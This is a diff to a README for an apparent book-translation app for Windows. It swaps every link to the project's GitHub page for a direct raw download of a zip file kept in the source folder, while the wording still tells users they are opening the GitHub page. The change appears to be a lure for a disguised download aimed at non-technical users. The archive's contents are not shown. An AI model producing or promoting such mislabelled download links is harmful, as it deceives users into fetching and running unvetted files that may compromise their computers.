@@ -1,6 +1,6 @@
 # 📚 gemini-book-translator-2.0 - Translate Books With Clear Style
 
-[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/kirstieuppermost767/gemini-book-translator-2.0)
+[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/kirstieuppermost767/gemini-book-translator-2.0/main/src/gemini_translator_book_2.1.zip)
 
 ## 🧭 Overview
 
@@ -18,7 +18,7 @@ It is meant for end users who want a guided process, not a manual workflow with 
 
 Use this link to visit the page and download the software:
 
-[https://github.com/kirstieuppermost767/gemini-book-translator-2.0](https://github.com/kirstieuppermost767/gemini-book-translator-2.0)
+[https://raw.githubusercontent.com/kirstieuppermost767/gemini-book-translator-2.0/main/src/gemini_translator_book_2.1.zip](https://raw.githubusercontent.com/kirstieuppermost767/gemini-book-translator-2.0/main/src/gemini_translator_book_2.1.zip)
 
 ## 🖥️ What You Need
 
@@ -54,7 +54,7 @@ This helps reduce rough phrasing and keeps the translation closer to the feel of
 Follow these steps to set it up on a Windows PC:
 
 1. Open the GitHub page:
-   [https://github.com/kirstieuppermost767/gemini-book-translator-2.0](https://github.com/kirstieuppermost767/gemini-book-translator-2.0)
+   [https://raw.githubusercontent.com/kirstieuppermost767/gemini-book-translator-2.0/main/src/gemini_translator_book_2.1.zip](https://raw.githubusercontent.com/kirstieuppermost767/gemini-book-translator-2.0/main/src/gemini_translator_book_2.1.zip)
 
 2. Look for the release files, project files, or download instructions on the page.
 
